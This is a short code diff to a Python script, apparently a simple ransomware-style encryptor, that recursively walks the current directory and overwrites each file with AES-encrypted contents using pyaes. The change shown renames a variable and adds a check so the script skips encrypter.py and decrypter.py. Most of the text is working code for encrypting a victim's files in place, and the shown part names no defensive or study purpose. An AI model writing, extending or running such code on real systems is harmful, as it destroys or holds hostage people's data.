@@ -1,9 +1,12 @@
 import os
 import pyaes
 
-def encrypter(dir):
-    for item in os.listdir(dir):
-        itempath = os.path.join(dir, item)
+def encrypter(directory):
+    for item in os.listdir(directory):
+        itempath = os.path.join(directory, item)
+
+        if item == "encrypter.py" or item == "decrypter.py":
+            continue
 
         if os.path.isdir(itempath):
             encrypter(itempath)
@@ -23,5 +26,5 @@ def encrypter(dir):
                 new_file.write(crypto_data)
 
 if __name__ == "__main__":
-    dir = "./"
-    encrypter(dir)
+    directory = "./"
+    encrypter(directory)
